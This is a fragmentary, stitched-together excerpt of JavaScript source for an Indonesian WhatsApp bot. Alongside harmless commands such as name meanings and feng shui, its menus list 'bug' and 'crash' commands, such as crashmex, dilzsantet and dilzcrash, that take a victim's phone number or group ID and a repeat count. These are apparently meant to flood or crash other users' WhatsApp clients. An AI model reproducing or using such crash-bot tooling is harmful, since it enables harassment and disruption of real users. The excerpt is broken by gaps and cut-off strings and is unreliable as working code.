if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
haikal.sendMessage(m.chat, anuala, `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
caption: `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${buttonkal}`,
} 
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
...
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ Gans`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢|Putri`
...
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
...
┃ ┃│⃟•╾ 𝐁𝐮𝐠𝐦𝐞𝐧𝐮➢
┃ ┃ ╰┈────────────╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
╭━━❍ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢❍━━╮
┃ ╭━━━━━━━━━━━━━━━━╮
┃ ┃ ╭┈────────────╮
...
┃╰━━━━━━━━━━━━━━━╯
┣━━━╼⃟݊⃟̥⃝̇݊݊⃟ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━•
┃╭━━━━━━━━━━━━━━━━╾•
┃┃   ❍ 𝑴𝑬𝑵𝑼 𝙈𝙊𝘿𝙎 ❍
┃╰━━━━━━━━━━━━━━━━╾•
┃╭━━━━━━━━━━━━━━━━╾•
...
╰━━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`, contextInfo:{"externalAdReply": {"title": `SC ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
...
╠➤𝐚𝐟𝐤 { 𝐤𝐚𝐬𝐢𝐡 𝐫𝐞𝐚𝐜𝐭𝐢𝐨𝐧𝐬 }
╠➤𝐝𝐢𝐥𝐳𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
╠➤𝐝𝐢𝐥𝐳𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
╠➤𝐝𝐢𝐥𝐳𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
...
╠➤ 𝐜𝐫𝐚𝐬𝐡𝐦𝐞𝐱 𝟔𝟐𝟖𝐱𝐱𝐱|𝟓|𝟓
╠➤𝐝𝐢𝐥𝐳𝐬𝐤𝐮𝐲 𝟔𝟐𝟖𝐱𝐱𝐱
╠➤𝐝𝐢𝐥𝐳𝐬𝐚𝐧𝐭𝐞𝐭 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
...
╔══════[ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ]══════⊱
╠➤𝐠𝐚𝐬𝐝𝐢𝐥𝐳 𝟏𝟏𝟐𝟔𝟕𝟒𝟒𝟒𝟖𝐱𝐱𝐱
╠➤𝐝𝐢𝐥𝐳𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜  𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
...
╠➤𝐝𝐢𝐥𝐳𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐢𝐥𝐳𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
...
╚════[ ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
contextInfo:{"externalAdReply": {"title": `SC ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
